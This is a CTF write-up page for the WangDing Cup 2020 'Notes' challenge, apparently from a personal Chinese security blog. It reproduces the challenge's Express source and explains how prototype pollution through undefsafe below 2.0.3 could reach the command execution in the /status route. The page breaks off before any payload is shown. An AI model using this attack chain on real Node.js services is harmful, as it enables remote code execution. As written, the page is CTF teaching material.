@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> Nssctf刷题-网鼎杯 -  clown</title>
+		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
+		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
+		<!-- lazyload -->
+		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
+		<!-- smooth-scrolling -->
+		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
+		<!-- highlight -->
+		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
+		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="clown">
+        <img
+			src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			alt="clown"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" title="clown">
+			<img
+				src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+				alt="clown"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>24</div>
+		<div><span>标签</span>13</div>
+		<div><span>分类</span>13</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/378722283"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/clowsman"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/ljc0033"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/Web/">
+              Web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/blog/">
+              blog
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/ctf-web/">
+              ctf web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/git/">
+              git
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/go/">
+              go
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/web/">
+              web
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/内网渗透/">
+              内网渗透
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/区块链/">
+              区块链
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础/">
+              基础
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础-计网/">
+              基础 计网
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础-计网/">
+              基础,计网
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/提权/">
+              提权
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/环境配置/">
+              环境配置
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/CTF-BC/" style="font-size: 10px;">CTF BC</a> <a href="/tags/CTF-web/" style="font-size: 10px;">CTF web</a> <a href="/tags/CTF-%E5%86%85%E7%BD%91/" style="font-size: 10px;">CTF 内网</a> <a href="/tags/Web-CTF/" style="font-size: 10px;">Web CTF</a> <a href="/tags/c-c-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">c/c++ 环境配置</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/ctf-%E5%88%B7%E9%A2%98/" style="font-size: 13.33px;">ctf 刷题</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/web-ctf-nodejs/" style="font-size: 10px;">web ctf nodejs</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 16.67px;">内网渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">学习</a> <a href="/tags/%E8%AE%A1%E7%BD%91/" style="font-size: 20px;">计网</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">clown</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png"
+				data-sizes="auto"
+				alt="Nssctf刷题-网鼎杯"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>Nssctf刷题-网鼎杯</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年03月20日</a>
+			<a><i class="kirafont icon-edit-fill"></i>1.7k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 8 分钟</a>
+		</div>
+		<h1><span id="wang-ding-bei-2020-qing-long-zu-notes">[网鼎杯 2020青龙组]Notes</span><a href="#wang-ding-bei-2020-qing-long-zu-notes" class="header-anchor">#</a></h1><p>这里没给题目源码只能网上找，app.js源码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure>
+
+<p>大概审了一遍之后就会知道，在&#x2F;status路由里面执行了命令，只要能够污染commands里面的属性就能rce，接下来就要去看看怎么样才能污染这个属性。</p>
+<p>看了一下只有undefsafe这个模块能够修改对象的属性，搜了一下该模块在低版本存在原型链污染漏洞，先来了解一下undefsafe模块</p>
+<blockquote>
+<p><code>undefsafe</code> 是一个用于安全地访问对象属性的库。它提供了一种安全的方法来访问嵌套在对象中的属性，而不会导致错误。这在处理可能不存在的属性时非常有用，因为它可以避免抛出异常，但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞。</p>
+</blockquote>
+<p>下面是几个例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure>
+
+<p>下面是一个原型链污染的例子：</p>
